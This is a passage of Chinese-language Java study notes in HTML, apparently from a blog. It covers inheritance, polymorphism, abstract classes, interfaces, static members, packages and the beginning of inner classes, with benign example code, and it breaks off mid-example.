&lt;h3 id="继承多态">继承&amp;amp;多态&lt;/h3>
&lt;ul>
&lt;li>使用&lt;code>extends&lt;/code>关键字，例&lt;code>class Student extends Person&lt;/code>&lt;/li>
&lt;li>subclass == extended class; super class == parent class == base class&lt;/li>
&lt;li>子类不可访问父类的&lt;code>private&lt;/code>字段和方法，不能覆写父类带有&lt;code>final&lt;/code>关键字的方法，不能继承带有&lt;code>final&lt;/code>的类，不能重新赋值带有&lt;code>final&lt;/code>的字段&lt;/li>
&lt;li>&lt;code>private&lt;/code>访问权限被限定在&lt;code>class&lt;/code>的内部，而且与方法声明顺序无关；如果一个类内部还定义了nested class嵌套类，那么，嵌套类拥有访问&lt;code>private&lt;/code>的权限&lt;/li>
&lt;li>定义为&lt;code>protected&lt;/code>的字段和方法可以被子类访问，以及子类的子类&lt;/li>
&lt;li>继承之后&lt;code>super.name&lt;/code>, &lt;code>this.name&lt;/code>, &lt;code>name&lt;/code>都是一个意思，但如果存在方法覆写后调用父类方法就必须用&lt;code>super.name&lt;/code>（联想NodeJS的&lt;code>.call&lt;/code>, &lt;code>.apply&lt;/code> 异曲同工之妙）&lt;/li>
&lt;li>未注明&lt;code>extends xxx&lt;/code>的类自动被补上了&lt;code>extends Object&lt;/code>，最顶层的&lt;code>object&lt;/code>也是可以被覆写的&lt;/li>
&lt;li>任何类的构造方法中第一行语句必须是调用父类的构造方法，如未注明会自动补上&lt;code>super();&lt;/code>，所以如果父类没有默认的构造方法，子类就必须显式调用&lt;code>super()&lt;/code>并给出参数以便让编译器定位到父类的一个合适的构造方法————一句话：子类不继承父类的构造方法，是自动生成的（联想Nodejs执行代码时的wrapper）&lt;/li>
&lt;li>Java15之后允许&lt;code>sealed&lt;/code>修饰class，并可通过&lt;code>permits&lt;/code>限制能从该类继承的子类名称（目前为预览状态，可开启&lt;code>--enable-preview&lt;/code>和&lt;code>--source 15&lt;/code>开启）&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">sealed&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Shape&lt;/span> &lt;span style="color:#111">permits&lt;/span> &lt;span style="color:#111">Rect&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Circle&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Triangle&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// xxx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>向上转型基本无问题，向下可能回报ClassCastException的错误，用&lt;code>instanceof&lt;/code>判断一个实例究竟是不是某种类型&lt;/li>
&lt;li>子类与父类方法签名完全相同时可覆写(Override)，加上&lt;code>@Override&lt;/code>可以让编译器帮助检查是否进行了正确的覆写（非必要）&lt;/li>
&lt;li>new来的对象如果指定的类型不同，实际调用其方法时会不同，run起来才知道具体用的啥，这个叫多态(Polymorphic)，有助于实现功能拓展，封装底层逻辑 优化交互&lt;/li>
&lt;/ul>
&lt;h3 id="抽象类接口">抽象类&amp;amp;接口&lt;/h3>
&lt;ul>
&lt;li>抽象类不实现任何功能 仅为了定义方法签名，目的就是为了让子类继承并覆盖，注意这个类本身也要声明为&lt;code>abstract&lt;/code>作抽象类&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 无子句
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>当我们定义了一个抽象类和N个具体类，我们可以用抽象类作引用类型去引用具体类的子类实例，好处在于对实例的方法进行调用时并不关心抽象类型变量的具体子类型&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Teacher&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 不关心Person变量的具体子类型:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 同样不关心新的子类是如何实现run()方法的：
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Employee&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这种尽量引用高层类型，避免引用实际子类型的方式，称之为面向抽象编程，本质：&lt;/p>
&lt;p>上层代码只定义规范(&lt;code>abstract class Person&lt;/code>)，不需要子类就可以实现业务逻辑（正常编译），具体的业务逻辑由不同的子类实现，调用者并不关心&lt;/p>
&lt;ul>
&lt;li>&lt;code>interface&lt;/code>比抽象类还抽象的纯抽象接口，无实例字段，所有方法都默认&lt;code>public abstract&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>当具体类实现一个接口时需要用&lt;code>implements&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; run&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>一个类可以实现多个接口，一个接口也可以继承自另一个接口&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 实现了两个interface
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Hello&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 继承另一个接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>在接口中，可以定义&lt;code>default&lt;/code>方法；&lt;code>default&lt;/code>方法和抽象类的普通方法是有所不同的。因为&lt;code>interface&lt;/code>没有字段，&lt;code>default&lt;/code>方法无法访问字段，而抽象类的普通方法可以访问实例字段(Java&amp;gt;=1.8)&lt;/li>
&lt;/ul>
&lt;h3 id="静态字段静态方法">静态字段&amp;amp;静态方法&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>用&lt;code>static&lt;/code>关键字修饰的字段处于同一个共享作用域中&lt;/p>
&lt;/li>
&lt;li>
&lt;p>不推荐用&lt;code>实例.静态字段&lt;/code>去访问静态字段，因为在java中实例对象并没有静态字段(实际)，代码中可以访问是因为编译器可以根据实例类型自动转换为&lt;code>类名.静态字段&lt;/code>来访问&lt;/p>
&lt;/li>
&lt;li>
&lt;p>推荐用类名来访问静态字段，可以将其理解为类本身的字段&lt;/p>
&lt;/li>
&lt;li>
&lt;p>调用实例方法必须通过一个实例变量，而调用静态方法则不需要实例变量，通过类名就可以调用&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">99&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">number&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">number&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setNumber&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>静态方法内部无法访问&lt;code>this&lt;/code>，也无法访问实例字段，只能访问静态字段&lt;/li>
&lt;li>静态方法常用于工具类，比如&lt;code>Arrays.sort()&lt;/code>和&lt;code>Math.random()&lt;/code>；java程序入口的&lt;code>main&lt;/code>也是静态方法噢&lt;/li>
&lt;li>对于接口而言虽然不能有实例字段，但是可以有&lt;code>public static final&lt;/code>加持的静态字段&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>public interface Person {
public static final int MALE = 1;
public static final int FEMALE = 2;
}
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 可简写
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 编译器会自动加上public statc final:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">MALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">FEMALE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">2&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="包">包&lt;/h3>
&lt;ul>
&lt;li>使用package包来解决名字冲突（各个语言都有了 很好懂），可以用类的全名&lt;/li>
&lt;li>包没有父子关系！java.util和java.util.zip是不同的包，两者没有任何继承关系&lt;/li>
&lt;li>所有Java文件对应的目录层次要和包的层次一致，编译后的&lt;code>.class&lt;/code>文件也需要按照包结构存放&lt;/li>
&lt;li>位于同一个包的类，可以访问包作用域的字段和方法。不用&lt;code>public&lt;/code>、&lt;code>protected&lt;/code>、&lt;code>private&lt;/code>修饰的字段和方法就是包作用域&lt;/li>
&lt;li>&lt;code>import static&lt;/code>可以导入可以导入一个类的静态字段和静态方法&lt;/li>
&lt;li>Java编译器最终编译出的&lt;code>.class&lt;/code>文件只使用完整类名(超长)，所以编译器在遇到&lt;code>class&lt;/code>名称时如果非完整类名，按照 当前package-&amp;gt;import的包-&amp;gt;java.lang包 的顺序进行查找&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Main.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">test&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.text.Format&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">List&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ok，使用完整类名 -&amp;gt; java.util.List
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Format&lt;/span> &lt;span style="color:#111">format&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ok，使用import的类 -&amp;gt; java.text.Format
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hi&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// ok，使用java.lang包的String -&amp;gt; java.lang.String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// ok，使用java.lang包的System -&amp;gt; java.lang.System
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">MessageFormat&lt;/span> &lt;span style="color:#111">mf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 编译错误：无法找到MessageFormat: MessageFormat cannot be resolved to a type
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>编写class时，编译器自动帮我们&lt;code>import java.lang.*&lt;/code>(不包含&lt;code>java.lang.reflect&lt;/code>这样的包)和&lt;code>import&lt;/code>当前&lt;code>package&lt;/code>的其它class&lt;/li>
&lt;li>把方法定义为&lt;code>package&lt;/code>权限有助于测试，因为测试类和被测试类只要位于同一个&lt;code>package&lt;/code>，测试代码就可以访问被测试类的&lt;code>package&lt;/code>权限方法&lt;/li>
&lt;/ul>
&lt;h3 id="内部类">内部类&lt;/h3>
&lt;ul>
&lt;li>或称nested class嵌套类&lt;/li>
&lt;li>Inner Class定义在一个类的内部，它的实例不能单独存在&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Outer&lt;/span> &lt;span style="color:#111">outer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Nested&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 实例化一个Outer
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Inner&lt;/span> &lt;span style="color:#111">inner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">outer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">new&lt;/span> &lt;span style="color:#75af00">Inner&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 实例化一个Inner
